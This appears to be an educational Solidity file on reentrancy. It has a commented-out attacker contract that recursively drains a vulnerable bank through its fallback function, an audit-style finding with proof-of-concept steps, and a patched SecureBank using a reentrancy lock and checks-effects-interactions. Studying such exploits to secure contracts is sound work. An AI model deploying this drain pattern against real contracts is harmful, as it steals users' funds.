// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/*
=========================================================
PRACTICAL: Reentrancy Attacker Contract
CONCEPT: Recursive ETH drain
=========================================================

WARNING:
This is an EDUCATIONAL ATTACK DEMO ONLY.

Do NOT deploy against real contracts.
=========================================================
*/

// interface IVulnerableBankval {
//     function withdraw(uint256 amount) external;
//     function deposit() external payable;
// }

// /*
// =========================================================
// ATTACK CONTRACT
// =========================================================
// */

// contract ReentrancyAttackerval {

//     IVulnerableBankval public bank;
//     address public owner;

//     uint256 public attackAmount;
//     bool public attacking;

//     constructor(address _bank) {
//         bank = IVulnerableBankval(_bank);
//         owner = msg.sender;
//     }

//     /*
//     =====================================================
//     START ATTACK
//     =====================================================
//     */

//     function attack() external payable {
//         require(msg.sender == owner, "Only owner");

//         /*
//             Store attack amount
//         */
//         attackAmount = msg.value;

//         /*
//             Step 1:
//             Deposit ETH into vulnerable bank
//         */
//         bank.deposit{value: msg.value}();

//         /*
//             Step 2:
//             Start withdrawal (triggers reentrancy)
//         */
//         attacking = true;
//         bank.withdraw(msg.value);
//         attacking = false;
//     }

//     /*
//     =====================================================
//     FALLBACK FUNCTION (REENTRANCY POINT)
//     =====================================================
//     */

//     fallback() external payable {

//         /*
//         =================================================
//         CRITICAL REENTRANCY LOOP
//         =================================================

//         This runs when bank sends ETH back.

//         BEFORE bank updates balance,
//         attacker re-enters withdraw().
//         */

//         if (attacking) {

//             uint256 bankBalance =
//                 address(bank).balance;

//             /*
//                 Continue attacking while bank has funds.
//             */
//             if (bankBalance >= attackAmount) {

//                 bank.withdraw(attackAmount);
//             }
//         }
//     }

//     /*
//     =====================================================
//     COLLECT STOLEN ETH
//     =====================================================
//     */

//     function withdrawStolen() external {
//         require(msg.sender == owner, "Only owner");

//         payable(owner).transfer(address(this).balance);
//     }

//     /*
//     =====================================================
//     VIEW CONTRACT BALANCE
//     =====================================================
//     */

//     function getBalance()
//         external
//         view
//         returns (uint256)
//     {
//         return address(this).balance;
//     }
// }

/*
Title: Recursive Reentrancy Attack via fallback()

Severity: Critical

Reason: The attacker counter recursively reenters the vulnerable bank coutract before balances are update

Location: Contract: ReentrancyAttacker
          Function: fallback()
          Target Contract Interaction: IVulnerableBank.withdraw(uint256 amount)

Vulnerability Description: The ReentrancyAttacker contract exploits a reentrancy vulnerability in the target bank contract

The attack occurs because the vulnerable bank sends ETH before updating internal balances

When ETH is received by the attacker contract the fallback() function executes aotomatically and recursively calls
bank.withdraw(attackAmount);

This allows repeated withdrawals before the bank updates the attacker's balance

Impact: An attacker can
- recursively drain ETH from the vulnerable bank
- bypass intended accounting logic
- stral funds belonging to other users
- empty the entire contract balance
potential consequences include
- total protocol insolvency
- permanent loss of user funds
- denial of service for withdrawals

Proof Of Concept:
Step 1:

Deploy vulnerable bank contract.

Step 2:

Deploy ReentrancyAttacker with bank address.

Step 3:

Fund vulnerable bank with ETH from victim users.

Step 4:

Attacker calls:

attack{value: 1 ether}();
Step 5:

Attack contract deposits ETH into bank.

Step 6:

Attack contract initiates:

bank.withdraw(msg.value);
Step 7:

Bank transfers ETH to attacker before updating balance.

Step 8:

fallback() executes automatically and recursively calls:

bank.withdraw(attackAmount);
Step 9:

Loop continues until vulnerable bank balance is drained.

Root Cause: The target balance contract violates the
Check -> Effects -> Interactions pattern

Specifically:
- external ETH transfer occurs before storage update
- no reentrancy protection exists
- recursive execution remains possible

*/

// PATCHED CODE

contract SecureBank
{
    // USER BALANCES
    mapping(address => uint256) public balances;

    // REENTRANCY LOCK
    bool private locked;

    // EVENTS
    event Deposit(address indexed user, uint256 amount);

    event Withdraw(address indexed user, uint256 amount);

    event AttackBlocked(address attacker);

    // NON REENTRANT MODIDIER
    modifier nonReentrant()
    {
        require(!locked,"Reentrancy detected");

        locked = true; _;

        locked = false;
    }

    // DEPOSIT ETH

    function deposit() external payable 
    {
        require(msg.value > 0, "Zero ETH");

        balances[msg.sender] += msg.value;

        emit Deposit(msg.sender, msg.value);
    }

    // SECURE WITHDRAW

    function withdraw(uint256 amount) external nonReentrant
    {
        // CHECKS
        require(balances[msg.sender] >= amount,"Insufficient balance");

        // EFFECTS

        balances[msg.sender] -= amount;

        // INTERACTIONS
        (bool success, ) = payable(msg.sender).call{value: amount}("");

        require(success, "Transfer failed");

        emit Withdraw(msg.sender, amount);
    }

    // VIEW USER BALANCE
    function getBalance(address user) external view returns(uint256)
    {
        return balances[user];
    }

    // CONTRACT BALANCE
    function contractBalance() external view returns (uint256)
    {
        return address(this).balance;
    }
}